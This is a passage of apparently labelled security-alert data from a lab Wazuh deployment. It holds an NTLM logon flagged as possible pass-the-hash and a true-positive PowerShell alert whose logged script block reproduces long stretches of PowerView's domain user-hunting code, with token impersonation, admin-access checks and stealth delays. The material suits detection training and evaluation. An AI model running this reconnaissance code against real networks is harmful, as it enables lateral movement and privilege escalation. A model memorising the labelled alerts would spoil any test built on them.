Workstation name is not always available and may be left blank in some cases.\r\n\r\nThe impersonation level field indicates the extent to which a process in the logon session can impersonate.\r\n\r\nThe authentication information fields provide detailed information about this specific logon request.\r\n\t- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.\r\n\t- Transited services indicate which intermediate services have participated in this logon request.\r\n\t- Package name indicates which sub-protocol was used among the NTLM protocols.\r\n\t- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.\"", "version": "3", "systemTime": "2025-07-06T12:18:15.1300305Z", "eventRecordID": "1681450", "threadID": "4728", "computer": "Win11Client.soclab.internal", "task": "12544", "processID": "928", "severityValue": "AUDIT_SUCCESS", "providerName": "Microsoft-Windows-Security-Auditing"}}}, "rule": {"mail": false, "hipaa": ["164.312.b"], "pci_dss": ["10.2.5"], "tsc": ["CC6.8", "CC7.2", "CC7.3"], "description": "Successful Remote Logon Detected - User:\\snell - NTLM authentication, possible pass-the-hash attack.", "groups": ["win_evt_channel", "windows", "authentication_success"], "nist_800_53": ["AC.7", "AU.14"], "gdpr": ["IV_32.2"], "firedtimes": 4, "mitre": {"technique": ["Pass the Hash", "Domain Accounts"], "id": ["T1550.002", "T1078.002"], "tactic": ["Defense Evasion", "Lateral Movement", "Persistence", "Privilege Escalation", "Initial Access"]}, "id": "92652", "gpg13": ["7.1", "7.2"]}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751804296.21903461", "full_log": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Security-Auditing\",\"providerGuid\":\"{54849625-5478-4994-a5ba-3e3b0328c30d}\",\"eventID\":\"4624\",\"version\":\"3\",\"level\":\"0\",\"task\":\"12544\",\"opcode\":\"0\",\"keywords\":\"0x8020000000000000\",\"systemTime\":\"2025-07-06T12:18:15.1300305Z\",\"eventRecordID\":\"1681450\",\"processID\":\"928\",\"threadID\":\"4728\",\"channel\":\"Security\",\"computer\":\"Win11Client.soclab.internal\",\"severityValue\":\"AUDIT_SUCCESS\",\"message\":\"\\\"An account was successfully logged on.\\r\\n\\r\\nSubject:\\r\\n\\tSecurity ID:\\t\\tS-1-0-0\\r\\n\\tAccount Name:\\t\\t-\\r\\n\\tAccount Domain:\\t\\t-\\r\\n\\tLogon ID:\\t\\t0x0\\r\\n\\r\\nLogon Information:\\r\\n\\tLogon Type:\\t\\t3\\r\\n\\tRestricted Admin Mode:\\t-\\r\\n\\tRemote Credential Guard:\\t-\\r\\n\\tVirtual Account:\\t\\tNo\\r\\n\\tElevated Token:\\t\\tYes\\r\\n\\r\\nImpersonation Level:\\t\\tImpersonation\\r\\n\\r\\nNew Logon:\\r\\n\\tSecurity ID:\\t\\tS-1-5-21-3023907177-3273552708-540821291-1107\\r\\n\\tAccount Name:\\t\\tsnell\\r\\n\\tAccount Domain:\\t\\tSOCLAB\\r\\n\\tLogon ID:\\t\\t0x2BCCEC6\\r\\n\\tLinked Logon ID:\\t\\t0x0\\r\\n\\tNetwork Account Name:\\t-\\r\\n\\tNetwork Account Domain:\\t-\\r\\n\\tLogon GUID:\\t\\t{00000000-0000-0000-0000-000000000000}\\r\\n\\r\\nProcess Information:\\r\\n\\tProcess ID:\\t\\t0x0\\r\\n\\tProcess Name:\\t\\t-\\r\\n\\r\\nNetwork Information:\\r\\n\\tWorkstation Name:\\t-\\r\\n\\tSource Network Address:\\t10.0.2.8\\r\\n\\tSource Port:\\t\\t48772\\r\\n\\r\\nDetailed Authentication Information:\\r\\n\\tLogon Process:\\t\\tNtLmSsp \\r\\n\\tAuthentication Package:\\tNTLM\\r\\n\\tTransited Services:\\t-\\r\\n\\tPackage Name (NTLM only):\\tNTLM V2\\r\\n\\tKey Length:\\t\\t128\\r\\n\\r\\nThis event is generated when a logon session is created. It is generated on the computer that was accessed.\\r\\n\\r\\nThe subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.\\r\\n\\r\\nThe logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).\\r\\n\\r\\nThe New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.\\r\\n\\r\\nThe network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.\\r\\n\\r\\nThe impersonation level field indicates the extent to which a process in the logon session can impersonate.\\r\\n\\r\\nThe authentication information fields provide detailed information about this specific logon request.\\r\\n\\t- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.\\r\\n\\t- Transited services indicate which intermediate services have participated in this logon request.\\r\\n\\t- Package name indicates which sub-protocol was used among the NTLM protocols.\\r\\n\\t- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.\\\"\"},\"eventdata\":{\"subjectUserSid\":\"S-1-0-0\",\"subjectLogonId\":\"0x0\",\"targetUserSid\":\"S-1-5-21-3023907177-3273552708-540821291-1107\",\"targetUserName\":\"snell\",\"targetDomainName\":\"SOCLAB\",\"targetLogonId\":\"0x2bccec6\",\"logonType\":\"3\",\"logonProcessName\":\"NtLmSsp\",\"authenticationPackageName\":\"NTLM\",\"logonGuid\":\"{00000000-0000-0000-0000-000000000000}\",\"lmPackageName\":\"NTLM V2\",\"keyLength\":\"128\",\"processId\":\"0x0\",\"ipAddress\":\"10.0.2.8\",\"ipPort\":\"48772\",\"impersonationLevel\":\"%%1833\",\"virtualAccount\":\"%%1843\",\"targetLinkedLogonId\":\"0x0\",\"elevatedToken\":\"%%1842\"}}}", "timestamp": "2025-07-06T12:18:16.013+0000"}, "fields": {"timestamp": ["2025-07-06T12:18:16.013Z"]}, "sort": [1751804296013]}}
{"id": "DAqV35cBiGYaRV9XQ66b", "description": "Powershell script used \"Invoke-command\" cmdlet to execute code on remote computer", "label": "TP", "rule_level": 14, "rule_priority": "High", "alert": {"_index": "wazuh-alerts-4.x-2025.07.06", "_id": "DAqV35cBiGYaRV9XQ66b", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"messageNumber": "42", "messageTotal": "51", "scriptBlockText": "        if ($StealthSource -match 'DFS|All') {                     Write-Verbose '[Find-DomainUserLocation] Querying for DFS servers'                     # # TODO: fix the passed parameters to Get-DomainDFSShare                     # $ComputerName += Get-DomainDFSShare -Domain $Domain -Server $DomainController | ForEach-Object {$_.RemoteServerName}                 }                 if ($StealthSource -match 'DC|All') {                     Write-Verbose '[Find-DomainUserLocation] Querying for domain controllers'                     $DCSearcherArguments = @{                         'LDAP' = $True                     }                     if ($PSBoundParameters['Domain']) { $DCSearcherArguments['Domain'] = $Domain }                     if ($PSBoundParameters['ComputerDomain']) { $DCSearcherArguments['Domain'] = $ComputerDomain }                     if ($PSBoundParameters['Server']) { $DCSearcherArguments['Server'] = $Server }                     if ($PSBoundParameters['Credential']) { $DCSearcherArguments['Credential'] = $Credential }                     $DomainControllers = Get-DomainController @DCSearcherArguments | Select-Object -ExpandProperty dnshostname                     if ($DomainControllers -isnot [System.Array]) { $DomainControllers = @($DomainControllers) }                     $TargetComputerArrayList.AddRange( $DomainControllers )                 }                 $TargetComputers = $TargetComputerArrayList.ToArray()             }             else {                 Write-Verbose '[Find-DomainUserLocation] Querying for all computers in the domain'                 $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname             }         }         Write-Verbose \\\"[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length)\\\"         if ($TargetComputers.Length -eq 0) {             throw '[Find-DomainUserLocation] No hosts found to enumerate'         }          # get the current user so we can ignore it in the results         if ($PSBoundParameters['Credential']) {             $CurrentUser = $Credential.GetNetworkCredential().UserName         }         else {             $CurrentUser = ([Environment]::UserName).ToLower()         }          # now build the user target set         if ($PSBoundParameters['ShowAll']) {             $TargetUsers = @()         }         elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {             $TargetUsers = Get-DomainUser @UserSearcherArguments | Select-Object -ExpandProperty samaccountname         }         else {             $GroupSearcherArguments = @{                 'Identity' = $UserGroupIdentity                 'Recurse' = $True             }             if ($PSBoundParameters['UserDomain']) { $GroupSearcherArguments['Domain'] = $UserDomain }             if ($PSBoundParameters['UserSearchBase']) { $GroupSearcherArguments['SearchBase'] = $UserSearchBase }             if ($PSBoundParameters['Server']) { $GroupSearcherArguments['Server'] = $Server }             if ($PSBoundParameters['SearchScope']) { $GroupSearcherArguments['SearchScope'] = $SearchScope }             if ($PSBoundParameters['ResultPageSize']) { $GroupSearcherArguments['ResultPageSize'] = $ResultPageSize }             if ($PSBoundParameters['ServerTimeLimit']) { $GroupSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }             if ($PSBoundParameters['Tombstone']) { $GroupSearcherArguments['Tombstone'] = $Tombstone }             if ($PSBoundParameters['Credential']) { $GroupSearcherArguments['Credential'] = $Credential }             $TargetUsers = Get-DomainGroupMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName         }          Write-Verbose \\\"[Find-DomainUserLocation] TargetUsers length: $($TargetUsers.Length)\\\"         if ((-not $ShowAll) -and ($TargetUsers.Length -eq 0)) {             throw '[Find-DomainUserLocation] No users found to target'         }          # the host enumeration block we're using to enumerate all servers         $HostEnumBlock = {             Param($ComputerName, $TargetUsers, $CurrentUser, $Stealth, $TokenHandle)              if ($TokenHandle) {                 # impersonate the the token produced by LogonUser()/Invoke-UserImpersonation                 $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet             }              ForEach ($TargetComputer in $ComputerName) {                 $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer                 if ($Up) {                     $Sessions = Get-NetSession -ComputerName $TargetComputer                     ForEach ($Session in $Sessions) {                         $UserName = $Session.UserName                         $CName = $Session.CName                          if ($CName -and $CName.StartsWith('\\\\\\\\')) {                             $CName = $CName.TrimStart('\\\\')                         }                          # make sure we have a result, and ignore computer$ sessions                         if (($UserName) -and ($UserName.Trim() -ne '') -and ($UserName -notmatch $CurrentUser) -and ($UserName -notmatch '\\\\$$')) {                              if ( (-not $TargetUsers) -or ($TargetUsers -contains $UserName)) {                                 $UserLocation = New-Object PSObject                                 $UserLocation | Add-Member Noteproperty 'UserDomain' $Null                                 $UserLocation | Add-Member Noteproperty 'UserName' $UserName                                 $UserLocation | Add-Member Noteproperty 'ComputerName' $TargetComputer                                 $UserLocation | Add-Member Noteproperty 'SessionFrom' $CName                                  # try to resolve the DNS hostname of $Cname                                 try {                                     $CNameDNSName = [System.Net.Dns]::GetHostEntry($CName) | Select-Object -ExpandProperty HostName                                     $UserLocation | Add-Member NoteProperty 'SessionFromName' $CnameDNSName                                 }                                 catch {                                     $UserLocation | Add-Member NoteProperty 'SessionFromName' $Null                                 }                                  # see if we're checking to see if we have local admin access on this machine                                 if ($CheckAccess) {                                     $Admin = (Test-AdminAccess -ComputerName $CName).IsAdmin                                     $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin                                 }                                 else {                                     $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Null                                 }                                 $UserLocation.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')                                 $UserLocation                             }                         }                     }                     if (-not $Stealth) {                         # if we're not 'stealthy', enumerate loggedon users as well                         $LoggedOn = Get-NetLoggedon -ComputerName $TargetComputer                         ForEach ($User in $LoggedOn) {                             $UserName = $User.UserName                             $UserDomain = $User.LogonDomain                              # make sure wet have a result                             if (($UserName) -and ($UserName.trim() -ne '')) {                                 if ( (-not $TargetUsers) -or ($TargetUsers -contains $UserName) -and ($UserName -notmatch '\\\\$$')) {                                     $IPAddress = @(Resolve-IPAddress -ComputerName $TargetComputer)[0].IPAddress                                     $UserLocation = New-Object PSObject                                     $UserLocation | Add-Member Noteproperty 'UserDomain' $UserDomain                                     $UserLocation | Add-Member Noteproperty 'UserName' $UserName                                     $UserLocation | Add-Member Noteproperty 'ComputerName' $TargetComputer                                     $UserLocation | Add-Member Noteproperty 'IPAddress' $IPAddress                                     $UserLocation | Add-Member Noteproperty 'SessionFrom' $Null                                     $UserLocation | Add-Member Noteproperty 'SessionFromName' $Null                                      # see if we're checking to see if we have local admin access on this machine                                     if ($CheckAccess) {                                         $Admin = Test-AdminAccess -ComputerName $TargetComputer                                         $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin                                     }                                     else {                                         $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Null                                     }                                     $UserLocation.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')                                     $UserLocation                                 }                             }                         }                     }                 }             }              if ($TokenHandle) {                 Invoke-RevertToSelf             }         }          $LogonToken = $Null         if ($PSBoundParameters['Credential']) {             if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {                 $LogonToken = Invoke-UserImpersonation -Credential $Credential             }             else {                 $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet             }         }     }      PROCESS {         # only ignore threading if -Delay is passed         if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {              Write-Verbose \\\"[Find-DomainUserLocation] Total number of hosts: $($TargetComputers.count)\\\"             Write-Verbose \\\"[Find-DomainUserLocation] Delay: $Delay, Jitter: $Jitter\\\"             $Counter = 0             $RandNo = New-Object System.Random              ForEach ($TargetComputer in $TargetComputers) {                 $Counter = $Counter + 1                  # sleep for our semi-randomized interval                 Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)                  Write-Verbose \\\"[Find-DomainUserLocation] Enumerating server $Computer ($Counter of $($TargetComputers.Count))\\\"                 Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $TargetUsers, $CurrentUser, $Stealth, $LogonToken                  if ($Result -and $StopOnSuccess) {                     Write-Verbose \\\"[Find-DomainUserLocation] Target user found, returning early\\\"                     return                 }             }         }         else {             Write-Verbose \\\"[Find-DomainUserLocation] Using threading with threads: $Threads\\\"             Write-Verbose \\\"[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length)\\\"              # if we're using threading, kick off the script block with New-ThreadedFunction             $ScriptParams = @{                 'TargetUsers' = $TargetUsers                 'CurrentUser' = $CurrentUser                 'Stealth' = $Stealth                 'TokenHandle' = $LogonToken             }              # if we're using threading, kick off the script block with New-ThreadedFunction using the $HostEnumBlock + params             New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads         }     }      END {         if ($LogonToken) {             Invoke-RevertToSelf -TokenHandle $LogonToken         }     } }   function Find-DomainProcess { &lt;# .SYNOPSIS  Searches for processes on the domain using WMI, returning processes that match a particular user specification or process name.  Thanks to @paulbrandau for the approach idea.  Author: Will Schroeder (@harmj0y)   License: BSD 3-Clause   Required Dependencies: Get-DomainComputer, Get-DomainUser, Get-DomainGroupMember, Get-WMIProcess, New-ThreadedFunction    .DESCRIPTION  This function enumerates all machines on the current (or specified) domain using Get-DomainComputer, and queries the domain for users of a specified group (default 'Domain Admins') with Get-DomainGroupMember. Then for each server the function enumerates any current processes running with Get-WMIProcess, searching for processes running under any target user contexts or with the specified -ProcessName. If -Credential is passed, it is passed through to the underlying WMI commands used to enumerate the remote machines.  .PARAMETER ComputerName  Specifies an array of one or more hosts to enumerate, passable on the pipeline. If -ComputerName is not passed, the default behavior is to enumerate all machines in the domain returned by Get-DomainComputer.  .PARAMETER Domain  Specifies the domain to query for computers AND users, defaults to the current domain.  .PARAMETER ComputerDomain  Specifies the domain to query for computers, defaults to the current domain.  .PARAMETER ComputerLDAPFilter  Specifies an LDAP query string that is used to search for computer objects.  .PARAMETER ComputerSearchBase  Specifies the LDAP source to search through for computers, e.g. \\\"LDAP://OU=secret,DC=testlab,DC=local\\\". Useful for OU queries.  .PARAMETER ComputerUnconstrained  Switch. Search computer objects that have unconstrained delegation.  .PARAMETER ComputerOperatingSystem  Search computers with a specific operating system, wildcards accepted.  .PARAMETER ComputerServicePack  Search computers with a specific service pack, wildcards accepted.  .PARAMETER ComputerSiteName  Search computers in the specific AD Site name, wildcards accepted.  .PARAMETER ProcessName  Search for processes with one or more specific names.  .PARAMETER UserIdentity  Specifies one or more user identities to search for.  .PARAMETER UserDomain  Specifies the domain to query for users to search for, defaults to the current domain.  .PARAMETER UserLDAPFilter  Specifies an LDAP query string that is used to search for target users.  .PARAMETER UserSearchBase  Specifies the LDAP source to search through for target users. e.g. \\\"LDAP://OU=secret,DC=testlab,DC=local\\\". Useful for OU queries.  .PARAMETER UserGroupIdentity  Specifies a group identity to query for target users, defaults to 'Domain Admins. If any other user specifications are set, then UserGroupIdentity is ignored.  .PARAMETER UserAdminCount  Switch. Search for users users with '(adminCount=1)' (meaning are/were privileged).  .PARAMETER Server  Specifies an Active Directory server (domain controller) to bind to.  .PARAMETER SearchScope  Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).  .PARAMETER ResultPageSize  Spec", "scriptBlockId": "a7aa712a-262a-46cc-9182-ebdb9a73fcc3"}, "system": {"eventID": "4104", "keywords": "0x0", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "level": "3", "channel": "Microsoft-Windows-PowerShell/Operational", "opcode": "15", "message": "\"Creating Scriptblock text (42 of 51):\r\n        if ($StealthSource -match 'DFS|All') {\n                    Write-Verbose '[Find-DomainUserLocation] Querying for DFS servers'\n                    # # TODO: fix the passed parameters to Get-DomainDFSShare\n                    # $ComputerName += Get-DomainDFSShare -Domain $Domain -Server $DomainController | ForEach-Object {$_.RemoteServerName}\n                }\n                if ($StealthSource -match 'DC|All') {\n                    Write-Verbose '[Find-DomainUserLocation] Querying for domain controllers'\n                    $DCSearcherArguments = @{\n                        'LDAP' = $True\n                    }\n                    if ($PSBoundParameters['Domain']) { $DCSearcherArguments['Domain'] = $Domain }\n                    if ($PSBoundParameters['ComputerDomain']) { $DCSearcherArguments['Domain'] = $ComputerDomain }\n                    if ($PSBoundParameters['Server']) { $DCSearcherArguments['Server'] = $Server }\n                    if ($PSBoundParameters['Credential']) { $DCSearcherArguments['Credential'] = $Credential }\n                    $DomainControllers = Get-DomainController @DCSearcherArguments | Select-Object -ExpandProperty dnshostname\n                    if ($DomainControllers -isnot [System.Array]) { $DomainControllers = @($DomainControllers) }\n                    $TargetComputerArrayList.AddRange( $DomainControllers )\n                }\n                $TargetComputers = $TargetComputerArrayList.ToArray()\n            }\n            else {\n                Write-Verbose '[Find-DomainUserLocation] Querying for all computers in the domain'\n                $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname\n            }\n        }\n        Write-Verbose \"[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length)\"\n        if ($TargetComputers.Length -eq 0) {\n            throw '[Find-DomainUserLocation] No hosts found to enumerate'\n        }\n\n        # get the current user so we can ignore it in the results\n        if ($PSBoundParameters['Credential']) {\n            $CurrentUser = $Credential.GetNetworkCredential().UserName\n        }\n        else {\n            $CurrentUser = ([Environment]::UserName).ToLower()\n        }\n\n        # now build the user target set\n        if ($PSBoundParameters['ShowAll']) {\n            $TargetUsers = @()\n        }\n        elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {\n            $TargetUsers = Get-DomainUser @UserSearcherArguments | Select-Object -ExpandProperty samaccountname\n        }\n        else {\n            $GroupSearcherArguments = @{\n                'Identity' = $UserGroupIdentity\n                'Recurse' = $True\n            }\n            if ($PSBoundParameters['UserDomain']) { $GroupSearcherArguments['Domain'] = $UserDomain }\n            if ($PSBoundParameters['UserSearchBase']) { $GroupSearcherArguments['SearchBase'] = $UserSearchBase }\n            if ($PSBoundParameters['Server']) { $GroupSearcherArguments['Server'] = $Server }\n            if ($PSBoundParameters['SearchScope']) { $GroupSearcherArguments['SearchScope'] = $SearchScope }\n            if ($PSBoundParameters['ResultPageSize']) { $GroupSearcherArguments['ResultPageSize'] = $ResultPageSize }\n            if ($PSBoundParameters['ServerTimeLimit']) { $GroupSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n            if ($PSBoundParameters['Tombstone']) { $GroupSearcherArguments['Tombstone'] = $Tombstone }\n            if ($PSBoundParameters['Credential']) { $GroupSearcherArguments['Credential'] = $Credential }\n            $TargetUsers = Get-DomainGroupMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName\n        }\n\n        Write-Verbose \"[Find-DomainUserLocation] TargetUsers length: $($TargetUsers.Length)\"\n        if ((-not $ShowAll) -and ($TargetUsers.Length -eq 0)) {\n            throw '[Find-DomainUserLocation] No users found to target'\n        }\n\n        # the host enumeration block we're using to enumerate all servers\n        $HostEnumBlock = {\n            Param($ComputerName, $TargetUsers, $CurrentUser, $Stealth, $TokenHandle)\n\n            if ($TokenHandle) {\n                # impersonate the the token produced by LogonUser()/Invoke-UserImpersonation\n                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet\n            }\n\n            ForEach ($TargetComputer in $ComputerName) {\n                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer\n                if ($Up) {\n                    $Sessions = Get-NetSession -ComputerName $TargetComputer\n                    ForEach ($Session in $Sessions) {\n                        $UserName = $Session.UserName\n                        $CName = $Session.CName\n\n                        if ($CName -and $CName.StartsWith('\\\\')) {\n                            $CName = $CName.TrimStart('\\')\n                        }\n\n                        # make sure we have a result, and ignore computer$ sessions\n                        if (($UserName) -and ($UserName.Trim() -ne '') -and ($UserName -notmatch $CurrentUser) -and ($UserName -notmatch '\\$$')) {\n\n                            if ( (-not $TargetUsers) -or ($TargetUsers -contains $UserName)) {\n                                $UserLocation = New-Object PSObject\n                                $UserLocation | Add-Member Noteproperty 'UserDomain' $Null\n                                $UserLocation | Add-Member Noteproperty 'UserName' $UserName\n                                $UserLocation | Add-Member Noteproperty 'ComputerName' $TargetComputer\n                                $UserLocation | Add-Member Noteproperty 'SessionFrom' $CName\n\n                                # try to resolve the DNS hostname of $Cname\n                                try {\n                                    $CNameDNSName = [System.Net.Dns]::GetHostEntry($CName) | Select-Object -ExpandProperty HostName\n                                    $UserLocation | Add-Member NoteProperty 'SessionFromName' $CnameDNSName\n                                }\n                                catch {\n                                    $UserLocation | Add-Member NoteProperty 'SessionFromName' $Null\n                                }\n\n                                # see if we're checking to see if we have local admin access on this machine\n                                if ($CheckAccess) {\n                                    $Admin = (Test-AdminAccess -ComputerName $CName).IsAdmin\n                                    $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin\n                                }\n                                else {\n                                    $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Null\n                                }\n                                $UserLocation.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')\n                                $UserLocation\n                            }\n                        }\n                    }\n                    if (-not $Stealth) {\n                        # if we're not 'stealthy', enumerate loggedon users as well\n                        $LoggedOn = Get-NetLoggedon -ComputerName $TargetComputer\n                        ForEach ($User in $LoggedOn) {\n                            $UserName = $User.UserName\n                            $UserDomain = $User.LogonDomain\n\n                            # make sure wet have a result\n                            if (($UserName) -and ($UserName.trim() -ne '')) {\n                                if ( (-not $TargetUsers) -or ($TargetUsers -contains $UserName) -and ($UserName -notmatch '\\$$')) {\n                                    $IPAddress = @(Resolve-IPAddress -ComputerName $TargetComputer)[0].IPAddress\n                                    $UserLocation = New-Object PSObject\n                                    $UserLocation | Add-Member Noteproperty 'UserDomain' $UserDomain\n                                    $UserLocation | Add-Member Noteproperty 'UserName' $UserName\n                                    $UserLocation | Add-Member Noteproperty 'ComputerName' $TargetComputer\n                                    $UserLocation | Add-Member Noteproperty 'IPAddress' $IPAddress\n                                    $UserLocation | Add-Member Noteproperty 'SessionFrom' $Null\n                                    $UserLocation | Add-Member Noteproperty 'SessionFromName' $Null\n\n                                    # see if we're checking to see if we have local admin access on this machine\n                                    if ($CheckAccess) {\n                                        $Admin = Test-AdminAccess -ComputerName $TargetComputer\n                                        $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin\n                                    }\n                                    else {\n                                        $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Null\n                                    }\n                                    $UserLocation.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')\n                                    $UserLocation\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n\n            if ($TokenHandle) {\n                Invoke-RevertToSelf\n            }\n        }\n\n        $LogonToken = $Null\n        if ($PSBoundParameters['Credential']) {\n            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {\n                $LogonToken = Invoke-UserImpersonation -Credential $Credential\n            }\n            else {\n                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet\n            }\n        }\n    }\n\n    PROCESS {\n        # only ignore threading if -Delay is passed\n        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {\n\n            Write-Verbose \"[Find-DomainUserLocation] Total number of hosts: $($TargetComputers.count)\"\n            Write-Verbose \"[Find-DomainUserLocation] Delay: $Delay, Jitter: $Jitter\"\n            $Counter = 0\n            $RandNo = New-Object System.Random\n\n            ForEach ($TargetComputer in $TargetComputers) {\n                $Counter = $Counter + 1\n\n                # sleep for our semi-randomized interval\n                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)\n\n                Write-Verbose \"[Find-DomainUserLocation] Enumerating server $Computer ($Counter of $($TargetComputers.Count))\"\n                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $TargetUsers, $CurrentUser, $Stealth, $LogonToken\n\n                if ($Result -and $StopOnSuccess) {\n                    Write-Verbose \"[Find-DomainUserLocation] Target user found, returning early\"\n                    return\n                }\n            }\n        }\n        else {\n            Write-Verbose \"[Find-DomainUserLocation] Using threading with threads: $Threads\"\n            Write-Verbose \"[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length)\"\n\n            # if we're using threading, kick off the script block with New-ThreadedFunction\n            $ScriptParams = @{\n                'TargetUsers' = $TargetUsers\n                'CurrentUser' = $CurrentUser\n                'Stealth' = $Stealth\n                'TokenHandle' = $LogonToken\n            }\n\n            # if we're using threading, kick off the script block with New-ThreadedFunction using the $HostEnumBlock + params\n            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads\n        }\n    }\n\n    END {\n        if ($LogonToken) {\n            Invoke-RevertToSelf -TokenHandle $LogonToken\n        }\n    }\n}\n\n\nfunction Find-DomainProcess {\n<#\n.SYNOPSIS\n\nSearches for processes on the domain using WMI, returning processes\nthat match a particular user specification or process name.\n\nThanks to @paulbrandau for the approach idea.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-DomainComputer, Get-DomainUser, Get-DomainGroupMember, Get-WMIProcess, New-ThreadedFunction  \n\n.DESCRIPTION\n\nThis function enumerates all machines on the current (or specified) domain\nusing Get-DomainComputer, and queries the domain for users of a specified group\n(default 'Domain Admins') with Get-DomainGroupMember. Then for each server the\nfunction enumerates any current processes running with Get-WMIProcess,\nsearching for processes running under any target user contexts or with the\nspecified -ProcessName. If -Credential is passed, it is passed through to\nthe underlying WMI commands used to enumerate the remote machines.\n\n.PARAMETER ComputerName\n\nSpecifies an array of one or more hosts to enumerate, passable on the pipeline.\nIf -ComputerName is not passed, the default behavior is to enumerate all machines\nin the domain returned by Get-DomainComputer.\n\n.PARAMETER Domain\n\nSpecifies the domain to query for computers AND users, defaults to the current domain.\n\n.PARAMETER ComputerDomain\n\nSpecifies the domain to query for computers, defaults to the current domain.\n\n.PARAMETER ComputerLDAPFilter\n\nSpecifies an LDAP query string that is used to search for computer objects.\n\n.PARAMETER ComputerSearchBase\n\nSpecifies the LDAP source to search through for computers,\ne.g. \"LDAP://OU=secret,DC=testlab,DC=local\". Useful for OU queries.\n\n.PARAMETER ComputerUnconstrained\n\nSwitch. Search computer objects that have unconstrained delegation.\n\n.PARAMETER ComputerOperatingSystem\n\nSearch computers with a specific operating system, wildcards accepted.\n\n.PARAMETER ComputerServicePack\n\nSearch computers with a specific service pack, wildcards accepted.\n\n.PARAMETER ComputerSiteName\n\nSearch computers in the specific AD Site name, wildcards accepted.\n\n.PARAMETER ProcessName\n\nSearch for processes with one or more specific names.\n\n.PARAMETER UserIdentity\n\nSpecifies one or more user identities to search for.\n\n.PARAMETER UserDomain\n\nSpecifies the domain to query for users to search for, defaults to the current domain.\n\n.PARAMETER UserLDAPFilter\n\nSpecifies an LDAP query string that is used to search for target users.\n\n.PARAMETER UserSearchBase\n\nSpecifies the LDAP source to search through for target users.\ne.g. \"LDAP://OU=secret,DC=testlab,DC=local\". Useful for OU queries.\n\n.PARAMETER UserGroupIdentity\n\nSpecifies a group identity to query for target users, defaults to 'Domain Admins.\nIf any other user specifications are set, then UserGroupIdentity is ignored.\n\n.PARAMETER UserAdminCount\n\nSwitch. Search for users users with '(adminCount=1)' (meaning are/were privileged).\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER SearchScope\n\nSpecifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).\n\n.PARAMETER ResultPageSize\n\nSpec\r\n\r\nScriptBlock ID: a7aa712a-262a-46cc-9182-ebdb9a73fcc3\r\nPath: \"", "version": "1", "systemTime": "2025-07-06T11:52:39.1620140Z", "eventRecordID": "11052", "threadID": "4108", "computer": "Win11Client.soclab.internal", "task": "2", "processID": 